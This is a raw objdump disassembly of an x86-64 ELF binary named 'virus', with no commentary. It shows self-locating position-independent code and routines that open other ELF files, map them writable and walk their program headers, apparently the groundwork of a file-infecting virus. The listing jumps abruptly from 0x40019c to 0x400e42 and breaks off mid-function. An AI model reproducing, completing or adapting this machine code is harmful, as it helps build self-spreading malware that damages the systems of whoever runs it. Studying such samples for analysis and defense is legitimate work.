
virus:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  400e42:	f3 0f 1e fa          	endbr64 
  400e46:	55                   	push   rbp
  400e47:	48 89 e5             	mov    rbp,rsp
  400e4a:	48 83 ec 30          	sub    rsp,0x30
  400e4e:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  400e52:	e8 a0 1e 00 00       	call   402cf7 <get_rip>
  400e57:	48 c7 c2 04 2d 40 00 	mov    rdx,0x402d04
  400e5e:	48 89 d1             	mov    rcx,rdx
  400e61:	48 c7 c2 12 2d 40 00 	mov    rdx,0x402d12
  400e68:	48 29 d1             	sub    rcx,rdx
  400e6b:	48 89 ca             	mov    rdx,rcx
  400e6e:	48 29 d0             	sub    rax,rdx
  400e71:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  400e75:	e8 7d 1e 00 00       	call   402cf7 <get_rip>
  400e7a:	48 c7 c2 04 2d 40 00 	mov    rdx,0x402d04
  400e81:	48 89 d1             	mov    rcx,rdx
  400e84:	48 c7 c2 27 2d 40 00 	mov    rdx,0x402d27
  400e8b:	48 29 d1             	sub    rcx,rdx
  400e8e:	48 89 ca             	mov    rdx,rcx
  400e91:	48 29 d0             	sub    rax,rdx
  400e94:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  400e98:	e8 5a 1e 00 00       	call   402cf7 <get_rip>
  400e9d:	48 c7 c2 04 2d 40 00 	mov    rdx,0x402d04
  400ea4:	48 89 d1             	mov    rcx,rdx
  400ea7:	48 c7 c2 9c 01 40 00 	mov    rdx,0x40019c
  400eae:	48 29 d1             	sub    rcx,rdx
  400eb1:	48 89 ca             	mov    rdx,rcx
  400eb4:	48 29 d0             	sub    rax,rdx
  400eb7:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  400ebb:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  400ebf:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400ec3:	48 89 50 50          	mov    QWORD PTR [rax+0x50],rdx
  400ec7:	48 c7 c0 12 2d 40 00 	mov    rax,0x402d12
  400ece:	48 89 c2             	mov    rdx,rax
  400ed1:	48 c7 c0 9c 01 40 00 	mov    rax,0x40019c
  400ed8:	48 29 c2             	sub    rdx,rax
  400edb:	48 89 d0             	mov    rax,rdx
  400ede:	48 89 c2             	mov    rdx,rax
  400ee1:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400ee5:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  400ee9:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400eed:	48 8b 50 58          	mov    rdx,QWORD PTR [rax+0x58]
  400ef1:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400ef5:	48 2b 45 f8          	sub    rax,QWORD PTR [rbp-0x8]
  400ef9:	48 98                	cdqe   
  400efb:	48 01 c2             	add    rdx,rax
  400efe:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f02:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  400f06:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f0a:	48 8b 40 58          	mov    rax,QWORD PTR [rax+0x58]
  400f0e:	48 8d 90 68 42 00 00 	lea    rdx,[rax+0x4268]
  400f15:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f19:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  400f1d:	b8 00 00 00 00       	mov    eax,0x0
  400f22:	c9                   	leave  
  400f23:	c3                   	ret    

0000000000400f24 <unload_target>:
  400f24:	f3 0f 1e fa          	endbr64 
  400f28:	55                   	push   rbp
  400f29:	48 89 e5             	mov    rbp,rsp
  400f2c:	48 83 ec 10          	sub    rsp,0x10
  400f30:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  400f34:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400f38:	48 8b 50 58          	mov    rdx,QWORD PTR [rax+0x58]
  400f3c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400f40:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  400f44:	48 89 d6             	mov    rsi,rdx
  400f47:	48 89 c7             	mov    rdi,rax
  400f4a:	e8 29 13 00 00       	call   402278 <_munmap>
  400f4f:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400f53:	8b 80 f8 00 00 00    	mov    eax,DWORD PTR [rax+0xf8]
  400f59:	89 c7                	mov    edi,eax
  400f5b:	e8 4c 11 00 00       	call   4020ac <_close>
  400f60:	90                   	nop
  400f61:	c9                   	leave  
  400f62:	c3                   	ret    

0000000000400f63 <load_target>:
  400f63:	f3 0f 1e fa          	endbr64 
  400f67:	55                   	push   rbp
  400f68:	48 89 e5             	mov    rbp,rsp
  400f6b:	53                   	push   rbx
  400f6c:	48 81 ec b8 00 00 00 	sub    rsp,0xb8
  400f73:	48 89 bd 48 ff ff ff 	mov    QWORD PTR [rbp-0xb8],rdi
  400f7a:	48 89 b5 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rsi
  400f81:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  400f88:	48 8b 95 48 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xb8]
  400f8f:	48 89 50 60          	mov    QWORD PTR [rax+0x60],rdx
  400f93:	48 8b 85 48 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb8]
  400f9a:	ba 00 00 00 00       	mov    edx,0x0
  400f9f:	be 00 00 00 00       	mov    esi,0x0
  400fa4:	48 89 c7             	mov    rdi,rax
  400fa7:	e8 ca 10 00 00       	call   402076 <_open>
  400fac:	89 45 e8             	mov    DWORD PTR [rbp-0x18],eax
  400faf:	83 7d e8 00          	cmp    DWORD PTR [rbp-0x18],0x0
  400fb3:	79 0a                	jns    400fbf <load_target+0x5c>
  400fb5:	b8 ff ff ff ff       	mov    eax,0xffffffff
  400fba:	e9 b1 03 00 00       	jmp    401370 <load_target+0x40d>
  400fbf:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  400fc6:	8b 55 e8             	mov    edx,DWORD PTR [rbp-0x18]
  400fc9:	89 90 f8 00 00 00    	mov    DWORD PTR [rax+0xf8],edx
  400fcf:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  400fd2:	48 98                	cdqe   
  400fd4:	48 8d 95 50 ff ff ff 	lea    rdx,[rbp-0xb0]
  400fdb:	48 89 d6             	mov    rsi,rdx
  400fde:	48 89 c7             	mov    rdi,rax
  400fe1:	e8 50 11 00 00       	call   402136 <_fstat>
  400fe6:	85 c0                	test   eax,eax
  400fe8:	79 0a                	jns    400ff4 <load_target+0x91>
  400fea:	b8 ff ff ff ff       	mov    eax,0xffffffff
  400fef:	e9 7c 03 00 00       	jmp    401370 <load_target+0x40d>
  400ff4:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  400ff7:	48 63 d0             	movsxd rdx,eax
  400ffa:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  400ffe:	41 b9 00 00 00 00    	mov    r9d,0x0
  401004:	49 89 d0             	mov    r8,rdx
  401007:	b9 02 00 00 00       	mov    ecx,0x2
  40100c:	ba 03 00 00 00       	mov    edx,0x3
  401011:	48 89 c6             	mov    rsi,rax
  401014:	bf 00 00 00 00       	mov    edi,0x0
  401019:	e8 f4 11 00 00       	call   402212 <_mmap>
  40101e:	48 8b 95 40 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xc0]
  401025:	48 89 42 50          	mov    QWORD PTR [rdx+0x50],rax
  401029:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401030:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  401034:	48 83 f8 ff          	cmp    rax,0xffffffffffffffff
  401038:	75 0a                	jne    401044 <load_target+0xe1>
  40103a:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40103f:	e9 2c 03 00 00       	jmp    401370 <load_target+0x40d>
  401044:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40104b:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40104f:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401056:	48 89 10             	mov    QWORD PTR [rax],rdx
  401059:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401060:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401064:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40106b:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40106e:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401072:	48 01 c2             	add    rdx,rax
  401075:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40107c:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  401080:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401087:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40108b:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401092:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401095:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  401099:	48 01 c2             	add    rdx,rax
  40109c:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010a3:	48 89 50 10          	mov    QWORD PTR [rax+0x10],rdx
  4010a7:	c7 45 ec 00 00 00 00 	mov    DWORD PTR [rbp-0x14],0x0
  4010ae:	e9 b6 01 00 00       	jmp    401269 <load_target+0x306>
  4010b3:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010ba:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4010be:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4010c1:	48 63 d0             	movsxd rdx,eax
  4010c4:	48 89 d0             	mov    rax,rdx
  4010c7:	48 c1 e0 03          	shl    rax,0x3
  4010cb:	48 29 d0             	sub    rax,rdx
  4010ce:	48 c1 e0 03          	shl    rax,0x3
  4010d2:	48 01 c8             	add    rax,rcx
  4010d5:	8b 00                	mov    eax,DWORD PTR [rax]
  4010d7:	83 f8 01             	cmp    eax,0x1
  4010da:	74 0e                	je     4010ea <load_target+0x187>
  4010dc:	83 f8 02             	cmp    eax,0x2
  4010df:	0f 84 3f 01 00 00    	je     401224 <load_target+0x2c1>
  4010e5:	e9 7b 01 00 00       	jmp    401265 <load_target+0x302>
  4010ea:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4010f1:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4010f5:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4010f8:	48 63 d0             	movsxd rdx,eax
  4010fb:	48 89 d0             	mov    rax,rdx
  4010fe:	48 c1 e0 03          	shl    rax,0x3
  401102:	48 29 d0             	sub    rax,rdx
  401105:	48 c1 e0 03          	shl    rax,0x3
  401109:	48 01 c8             	add    rax,rcx
  40110c:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401110:	48 85 c0             	test   rax,rax
  401113:	0f 95 c0             	setne  al
  401116:	0f b6 c0             	movzx  eax,al
  401119:	85 c0                	test   eax,eax
  40111b:	74 0a                	je     401127 <load_target+0x1c4>
  40111d:	83 f8 01             	cmp    eax,0x1
  401120:	74 6c                	je     40118e <load_target+0x22b>
  401122:	e9 3e 01 00 00       	jmp    401265 <load_target+0x302>
  401127:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40112e:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401132:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401135:	48 63 d0             	movsxd rdx,eax
  401138:	48 89 d0             	mov    rax,rdx
  40113b:	48 c1 e0 03          	shl    rax,0x3
  40113f:	48 29 d0             	sub    rax,rdx
  401142:	48 c1 e0 03          	shl    rax,0x3
  401146:	48 01 c8             	add    rax,rcx
  401149:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  40114d:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401154:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  401158:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40115f:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401163:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401166:	48 63 d0             	movsxd rdx,eax
  401169:	48 89 d0             	mov    rax,rdx
  40116c:	48 c1 e0 03          	shl    rax,0x3
  401170:	48 29 d0             	sub    rax,rdx
  401173:	48 c1 e0 03          	shl    rax,0x3
  401177:	48 01 c8             	add    rax,rcx
  40117a:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  40117e:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401185:	48 89 50 30          	mov    QWORD PTR [rax+0x30],rdx
  401189:	e9 94 00 00 00       	jmp    401222 <load_target+0x2bf>
  40118e:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401195:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401199:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40119c:	48 63 d0             	movsxd rdx,eax
  40119f:	48 89 d0             	mov    rax,rdx
  4011a2:	48 c1 e0 03          	shl    rax,0x3
  4011a6:	48 29 d0             	sub    rax,rdx
  4011a9:	48 c1 e0 03          	shl    rax,0x3
  4011ad:	48 01 c8             	add    rax,rcx
  4011b0:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  4011b4:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4011bb:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  4011bf:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4011c6:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4011ca:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4011cd:	48 63 d0             	movsxd rdx,eax
  4011d0:	48 89 d0             	mov    rax,rdx
  4011d3:	48 c1 e0 03          	shl    rax,0x3
  4011d7:	48 29 d0             	sub    rax,rdx
  4011da:	48 c1 e0 03          	shl    rax,0x3
  4011de:	48 01 c8             	add    rax,rcx
  4011e1:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  4011e5:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4011ec:	48 89 50 38          	mov    QWORD PTR [rax+0x38],rdx
  4011f0:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4011f7:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4011fb:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4011fe:	48 63 d0             	movsxd rdx,eax
  401201:	48 89 d0             	mov    rax,rdx
  401204:	48 c1 e0 03          	shl    rax,0x3
  401208:	48 29 d0             	sub    rax,rdx
  40120b:	48 c1 e0 03          	shl    rax,0x3
  40120f:	48 01 c8             	add    rax,rcx
  401212:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  401216:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40121d:	48 89 50 40          	mov    QWORD PTR [rax+0x40],rdx
  401221:	90                   	nop
  401222:	eb 41                	jmp    401265 <load_target+0x302>
  401224:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40122b:	48 8b 48 50          	mov    rcx,QWORD PTR [rax+0x50]
  40122f:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401236:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  40123a:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40123d:	48 63 d0             	movsxd rdx,eax
  401240:	48 89 d0             	mov    rax,rdx
  401243:	48 c1 e0 03          	shl    rax,0x3
  401247:	48 29 d0             	sub    rax,rdx
  40124a:	48 c1 e0 03          	shl    rax,0x3
  40124e:	48 01 f0             	add    rax,rsi
  401251:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401255:	48 8d 14 01          	lea    rdx,[rcx+rax*1]
  401259:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401260:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  401264:	90                   	nop
  401265:	83 45 ec 01          	add    DWORD PTR [rbp-0x14],0x1
  401269:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401270:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401273:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  401277:	0f b7 c0             	movzx  eax,ax
  40127a:	39 45 ec             	cmp    DWORD PTR [rbp-0x14],eax
  40127d:	0f 8c 30 fe ff ff    	jl     4010b3 <load_target+0x150>
  401283:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40128a:	48 8b 8d 50 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xb0]
  401291:	48 8b 9d 58 ff ff ff 	mov    rbx,QWORD PTR [rbp-0xa8]
  401298:	48 89 48 68          	mov    QWORD PTR [rax+0x68],rcx
  40129c:	48 89 58 70          	mov    QWORD PTR [rax+0x70],rbx
  4012a0:	48 8b 8d 60 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xa0]
  4012a7:	48 8b 9d 68 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x98]
  4012ae:	48 89 48 78          	mov    QWORD PTR [rax+0x78],rcx
  4012b2:	48 89 98 80 00 00 00 	mov    QWORD PTR [rax+0x80],rbx
  4012b9:	48 8b 8d 70 ff ff ff 	mov    rcx,QWORD PTR [rbp-0x90]
  4012c0:	48 8b 9d 78 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x88]
  4012c7:	48 89 88 88 00 00 00 	mov    QWORD PTR [rax+0x88],rcx
  4012ce:	48 89 98 90 00 00 00 	mov    QWORD PTR [rax+0x90],rbx
  4012d5:	48 8b 4d 80          	mov    rcx,QWORD PTR [rbp-0x80]
  4012d9:	48 8b 5d 88          	mov    rbx,QWORD PTR [rbp-0x78]
  4012dd:	48 89 88 98 00 00 00 	mov    QWORD PTR [rax+0x98],rcx
  4012e4:	48 89 98 a0 00 00 00 	mov    QWORD PTR [rax+0xa0],rbx
  4012eb:	48 8b 4d 90          	mov    rcx,QWORD PTR [rbp-0x70]
  4012ef:	48 8b 5d 98          	mov    rbx,QWORD PTR [rbp-0x68]
  4012f3:	48 89 88 a8 00 00 00 	mov    QWORD PTR [rax+0xa8],rcx
  4012fa:	48 89 98 b0 00 00 00 	mov    QWORD PTR [rax+0xb0],rbx
  401301:	48 8b 4d a0          	mov    rcx,QWORD PTR [rbp-0x60]
  401305:	48 8b 5d a8          	mov    rbx,QWORD PTR [rbp-0x58]
  401309:	48 89 88 b8 00 00 00 	mov    QWORD PTR [rax+0xb8],rcx
  401310:	48 89 98 c0 00 00 00 	mov    QWORD PTR [rax+0xc0],rbx
  401317:	48 8b 4d b0          	mov    rcx,QWORD PTR [rbp-0x50]
  40131b:	48 8b 5d b8          	mov    rbx,QWORD PTR [rbp-0x48]
  40131f:	48 89 88 c8 00 00 00 	mov    QWORD PTR [rax+0xc8],rcx
  401326:	48 89 98 d0 00 00 00 	mov    QWORD PTR [rax+0xd0],rbx
  40132d:	48 8b 4d c0          	mov    rcx,QWORD PTR [rbp-0x40]
  401331:	48 8b 5d c8          	mov    rbx,QWORD PTR [rbp-0x38]
  401335:	48 89 88 d8 00 00 00 	mov    QWORD PTR [rax+0xd8],rcx
  40133c:	48 89 98 e0 00 00 00 	mov    QWORD PTR [rax+0xe0],rbx
  401343:	48 8b 4d d0          	mov    rcx,QWORD PTR [rbp-0x30]
  401347:	48 8b 5d d8          	mov    rbx,QWORD PTR [rbp-0x28]
  40134b:	48 89 88 e8 00 00 00 	mov    QWORD PTR [rax+0xe8],rcx
  401352:	48 89 98 f0 00 00 00 	mov    QWORD PTR [rax+0xf0],rbx
  401359:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  40135d:	48 89 c2             	mov    rdx,rax
  401360:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401367:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  40136b:	b8 00 00 00 00       	mov    eax,0x0
  401370:	48 81 c4 b8 00 00 00 	add    rsp,0xb8
  401377:	5b                   	pop    rbx
  401378:	5d                   	pop    rbp
  401379:	c3                   	ret    

000000000040137a <load_target_writeable>:
  40137a:	f3 0f 1e fa          	endbr64 
  40137e:	55                   	push   rbp
  40137f:	48 89 e5             	mov    rbp,rsp
  401382:	53                   	push   rbx
  401383:	48 81 ec b8 00 00 00 	sub    rsp,0xb8
  40138a:	48 89 bd 48 ff ff ff 	mov    QWORD PTR [rbp-0xb8],rdi
  401391:	48 89 b5 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],rsi
  401398:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40139f:	48 8b 95 48 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xb8]
  4013a6:	48 89 50 60          	mov    QWORD PTR [rax+0x60],rdx
  4013aa:	48 8b 85 48 ff ff ff 	mov    rax,QWORD PTR [rbp-0xb8]
  4013b1:	ba 00 00 00 00       	mov    edx,0x0
  4013b6:	be 02 00 00 00       	mov    esi,0x2
  4013bb:	48 89 c7             	mov    rdi,rax
  4013be:	e8 b3 0c 00 00       	call   402076 <_open>
  4013c3:	89 45 e8             	mov    DWORD PTR [rbp-0x18],eax
  4013c6:	83 7d e8 00          	cmp    DWORD PTR [rbp-0x18],0x0
  4013ca:	79 0a                	jns    4013d6 <load_target_writeable+0x5c>
  4013cc:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4013d1:	e9 b1 03 00 00       	jmp    401787 <load_target_writeable+0x40d>
  4013d6:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4013dd:	8b 55 e8             	mov    edx,DWORD PTR [rbp-0x18]
  4013e0:	89 90 f8 00 00 00    	mov    DWORD PTR [rax+0xf8],edx
  4013e6:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  4013e9:	48 98                	cdqe   
  4013eb:	48 8d 95 50 ff ff ff 	lea    rdx,[rbp-0xb0]
  4013f2:	48 89 d6             	mov    rsi,rdx
  4013f5:	48 89 c7             	mov    rdi,rax
  4013f8:	e8 39 0d 00 00       	call   402136 <_fstat>
  4013fd:	85 c0                	test   eax,eax
  4013ff:	79 0a                	jns    40140b <load_target_writeable+0x91>
  401401:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401406:	e9 7c 03 00 00       	jmp    401787 <load_target_writeable+0x40d>
  40140b:	8b 45 e8             	mov    eax,DWORD PTR [rbp-0x18]
  40140e:	48 63 d0             	movsxd rdx,eax
  401411:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  401415:	41 b9 00 00 00 00    	mov    r9d,0x0
  40141b:	49 89 d0             	mov    r8,rdx
  40141e:	b9 01 00 00 00       	mov    ecx,0x1
  401423:	ba 03 00 00 00       	mov    edx,0x3
  401428:	48 89 c6             	mov    rsi,rax
  40142b:	bf 00 00 00 00       	mov    edi,0x0
  401430:	e8 dd 0d 00 00       	call   402212 <_mmap>
  401435:	48 8b 95 40 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xc0]
  40143c:	48 89 42 50          	mov    QWORD PTR [rdx+0x50],rax
  401440:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401447:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  40144b:	48 83 f8 ff          	cmp    rax,0xffffffffffffffff
  40144f:	75 0a                	jne    40145b <load_target_writeable+0xe1>
  401451:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401456:	e9 2c 03 00 00       	jmp    401787 <load_target_writeable+0x40d>
  40145b:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401462:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401466:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40146d:	48 89 10             	mov    QWORD PTR [rax],rdx
  401470:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401477:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40147b:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401482:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401485:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  401489:	48 01 c2             	add    rdx,rax
  40148c:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401493:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  401497:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40149e:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4014a2:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014a9:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4014ac:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  4014b0:	48 01 c2             	add    rdx,rax
  4014b3:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014ba:	48 89 50 10          	mov    QWORD PTR [rax+0x10],rdx
  4014be:	c7 45 ec 00 00 00 00 	mov    DWORD PTR [rbp-0x14],0x0
  4014c5:	e9 b6 01 00 00       	jmp    401680 <load_target_writeable+0x306>
  4014ca:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4014d1:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4014d5:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4014d8:	48 63 d0             	movsxd rdx,eax
  4014db:	48 89 d0             	mov    rax,rdx
  4014de:	48 c1 e0 03          	shl    rax,0x3
  4014e2:	48 29 d0             	sub    rax,rdx
  4014e5:	48 c1 e0 03          	shl    rax,0x3
  4014e9:	48 01 c8             	add    rax,rcx
  4014ec:	8b 00                	mov    eax,DWORD PTR [rax]
  4014ee:	83 f8 01             	cmp    eax,0x1
  4014f1:	74 0e                	je     401501 <load_target_writeable+0x187>
  4014f3:	83 f8 02             	cmp    eax,0x2
  4014f6:	0f 84 3f 01 00 00    	je     40163b <load_target_writeable+0x2c1>
  4014fc:	e9 7b 01 00 00       	jmp    40167c <load_target_writeable+0x302>
  401501:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401508:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40150c:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40150f:	48 63 d0             	movsxd rdx,eax
  401512:	48 89 d0             	mov    rax,rdx
  401515:	48 c1 e0 03          	shl    rax,0x3
  401519:	48 29 d0             	sub    rax,rdx
